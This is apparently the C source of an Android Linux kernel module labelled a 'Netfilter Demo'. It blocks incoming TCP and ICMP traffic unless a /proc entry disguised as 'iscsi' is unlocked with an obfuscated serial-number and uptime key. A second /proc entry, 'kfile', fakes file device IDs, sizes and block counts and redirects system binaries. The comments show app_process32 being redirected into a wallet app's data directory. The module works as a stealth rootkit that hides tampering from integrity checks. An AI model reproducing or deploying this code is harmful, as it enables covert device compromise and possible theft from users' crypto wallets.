#include <linux/module.h>  
#include <linux/kernel.h>  
#include <linux/init.h>  
// #include <linux/netfilter.h>
// #include <linux/netdevice.h>
#include <linux/netfilter_ipv4.h>  
// #include <linux/skbuff.h>
// #include <linux/inet.h> 
#include <linux/ip.h>  
#include <linux/tcp.h>
#include <linux/udp.h> 
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/timer.h>
#include <linux/fs.h>

#define SNO "boot.serialno="
#define BUFSIZE  1024

struct timer_list ntimer;
struct proc_dir_entry * dev_debug_proc = NULL;
struct proc_dir_entry * file_control_proc = NULL;
static unsigned int used = 0;
static unsigned int deny = 1;
static unsigned int enable = 0;

extern void changeBootTime(void);

static unsigned int NET_HookLocalIn(
	void *priv, 
	struct sk_buff *skb, 
	const struct nf_hook_state *state)
{
	int retval = NF_ACCEPT;
	if(skb){	
		struct iphdr *iph;
		iph = ip_hdr(skb); 

		// change me
		if(iph->protocol == IPPROTO_TCP || iph->protocol == IPPROTO_ICMP)  
		{
			if(1 == deny) 
				retval = NF_DROP;
		}
	}
	return retval;  
}

static struct nf_hook_ops net_hooks_ops = 
{
	.hook		= NET_HookLocalIn,
	.pf		= PF_INET,
	.hooknum	= NF_INET_LOCAL_IN,
	.priority	= NF_IP_PRI_FIRST,
};

//#if LINUX_VERSION_CODE < KERNEL_VERSION(4,14,0)
//void en_timer_tmp(unsigned long arg)
//{
//	if(1 != enable)
//		deny = 1;
//	del_timer(&ntimer);
//}
//#else
void en_timer_tmp(struct timer_list *t)
{
	if(1 != enable)
		deny = 1;
	del_timer(&ntimer);
}
//#endif

// write '1' to enable network for 20 seconds
// sec: all 128 nums (char & int)
// time: 1601787, 截取后四位:t=1787, t[0]--sec[16] t[1]--sec[68], t[2]=sec[93], t[3]=sec[115] 
// sn: a2855628, 不满8位凑够8位
//               sn[1]--sec[18] or sec[21], 
// 		 sn[3]--sec[14] or sec[39], 
// 		 sn[5]--sec[45] or sec[49], 
// 		 sn[6]--sec[79], 
static ssize_t iiscsi_write(struct file *file,
                const char __user *buffer, size_t count, loff_t *pos)
{
    char sno[64];
    char *sno_ptr;
    struct timespec uptime;
    char data_string[BUFSIZE];
    char apktime_string[5];
    int cur_time = 0, apk_time = 0;
    if(*pos > 0 || count > BUFSIZE)
        return -EFAULT;
    if(copy_from_user(data_string, buffer, count))
        return -EINVAL;
    if(2 == count && data_string[0] == '1') {
	    if(0 == used) {
		used = 1;
	   	deny = 0;
//#if LINUX_VERSION_CODE < KERNEL_VERSION(4,14,0)
//		init_timers(&ntimer);
//		ntimer.function = en_timer_tmp;
//		ntimer.data = 1;
//		ntimer.expires = jiffies + 15 * HZ;
//		add_timer(&ntimer);
//#else
		timer_setup(&ntimer, en_timer_tmp, 0);
		ntimer.expires = jiffies + 15 * HZ;
		add_timer(&ntimer);
//#endif
		changeBootTime();
	    }
    } else if(129 == count) {
	get_monotonic_boottime(&uptime);
	// check uptime(s)
	cur_time = uptime.tv_sec % 10000;
	apktime_string[0] = data_string[16];
	apktime_string[1] = data_string[68];
	apktime_string[2] = data_string[93];
	apktime_string[3] = data_string[115];
	apktime_string[4] = '\0';
	kstrtoint(apktime_string, 10, &apk_time); 
	if(apk_time <= 0 || cur_time <= 0 || cur_time - apk_time > 15 || cur_time - apk_time < 0) 
		return count;

	// check serialno
	sno_ptr = strstr(saved_command_line, SNO);
	if(sno_ptr) {
		sscanf(sno_ptr, SNO"%8s", sno);
		// print serialno
	}

	if((sno[1] == data_string[18] || sno[1] == data_string[21])
	 	&& (sno[3] == data_string[14] || sno[3] == data_string[39]) 
	 	&& (sno[5] == data_string[45] || sno[5] == data_string[49]) 
	 	&& (sno[6] == data_string[79]) 
		) {
		enable = 1;
		deny = 0;
	}
    }
    return count;
}

// notice: as "1 /system/bin 64517 ", there's a space at latest.
// $ stat /data  =>  Device: fc05h/64517d   
// $ echo "1 /data 64518 " > /proc/kfile => change device

// $ stat /system/bin/app_process32  =>  Size: 138772	 Blocks: 272
// $ echo "2 /system/bin/app_process32 272 138772 " > /proc/kfile => change blocks & size

// $ stat /system/bin/app_process32
// $ echo "3 /system/bin/app_process32 /data/data/im.token.app/app_process32 " > /proc/kfile
// redirect /system/bin/app_process32 -> /data/data/im.token.app/app_process32
static ssize_t filec_write(struct file *file,
                const char __user *buffer, size_t count, loff_t *pos)
{
    char data_string[BUFSIZE];
	char *data = data_string;
	char *file_path;
	char *new_file_path;
	char *device_str;
	char *blocks_str;
	long long blocks;
	char *size_str;
	long long size;
	unsigned int device_u32;
    if(*pos > 0 || count > BUFSIZE)
        return -EFAULT;
    if(copy_from_user(data_string, buffer, count))
        return -EINVAL;
    if(data_string[0] == '1') {
		strsep(&data, " "); // 1
		file_path = strsep(&data, " "); // /system/bin
		device_str = strsep(&data, " "); // 64517
		kstrtouint(device_str, 0, &device_u32);
		if(!device_u32) {
			printk("failed to parse device %s", device_str);
			return count;
		}
		set_file_stat_device(file_path, (__u32)device_u32);
		//set_file_stat_device("/data", (__u32)64518);
		//printk("pcc------file_path:%s; device_str:%d;\n", file_path, device_u32);
    } else if(data_string[0] == '2') {
		strsep(&data, " "); // 2
		file_path = strsep(&data, " "); // /system/bin/app_process32
		blocks_str = strsep(&data, " "); // 272
		kstrtoull(blocks_str, 0, &blocks);
		if(!blocks) {
			printk("failed to parse blocks %s", blocks_str);
			return count;
		}
		size_str = strsep(&data, " "); // 138772
		kstrtoull(size_str, 0, &size);
		if(!size) {
			printk("failed to parse size %s", size_str);
			return count;
		}

		set_file_stat_size(file_path, size, blocks);
	} else if(data_string[0] == '3') {
		strsep(&data, " "); // 3
		file_path = strsep(&data, " "); // /system/bin/app_process32
		new_file_path = strsep(&data, " "); // /data/data/xxx/app_process32
		set_file_redir(file_path, new_file_path);
	}
    return count;
}

static int filec_show(struct seq_file *m, void *v)
{
	seq_printf(m, "filec\n");
    return 0;
}

static int filec_open(struct inode *inode, struct file *file)
{
        return single_open(file, filec_show, NULL);
}

//static ssize_t iiscsi_read(struct file *filp, char __user *buf, size_t len, loff_t *off)
//{
//	char sbuf[64];
//	unsigned long now = jiffies;
//	int size = 0;
//	size = sprintf(sbuf, "num:%lu", jiffies_to_clock_t(now));
//	printk("size:%d", size);
//	copy_to_user(buf, sbuf, size);
//	return size;
//}
//        .read = iiscsi_read,

static int iiscsi_show(struct seq_file *m, void *v)
{
	// used:   1--temp enable network chance used
	// enable: 1--network is completely enabled
	seq_printf(m, "%d-%d\n", used, enable);

        return 0;
}

static int iiscsi_open(struct inode *inode, struct file *file)
{
        return single_open(file, iiscsi_show, NULL);
}

static const struct file_operations yaffs_fops = {
	.owner = THIS_MODULE,
	.open  = iiscsi_open,
	.read  = seq_read,
	.llseek = seq_lseek,
    .write = iiscsi_write,
	.release = single_release,
};

static const struct file_operations filec_fops = {
	.owner = THIS_MODULE,
	.open  = filec_open,
	.read  = seq_read,
	.llseek = seq_lseek,
    .write = filec_write,
	.release = single_release,
};

int __init create_dev_debug_proc(void)
{
    dev_debug_proc = proc_create("iscsi", S_IWUSR | S_IRUSR, NULL, &yaffs_fops);
    if(dev_debug_proc == NULL){
        return -EIO;
    }

	file_control_proc = proc_create("kfile", S_IWUSR | S_IRUSR, NULL, &filec_fops);
    if(file_control_proc == NULL){
        return -EIO;
    }

    return 0;
}

static int __init net_hooks_init(void) 
{
	nf_register_net_hook(&init_net, &net_hooks_ops);
	create_dev_debug_proc();
	return 0; 
}

static void __exit net_hooks_exit(void)
{
	nf_unregister_net_hook(&init_net, &net_hooks_ops);
	proc_remove(dev_debug_proc);
	proc_remove(file_control_proc);
} 

module_init(net_hooks_init); 
module_exit(net_hooks_exit); 

MODULE_LICENSE("Dual BSD/GPL");  
MODULE_AUTHOR("skyhood");  
MODULE_DESCRIPTION("Netfilter Demo");  
MODULE_VERSION("1.0");  

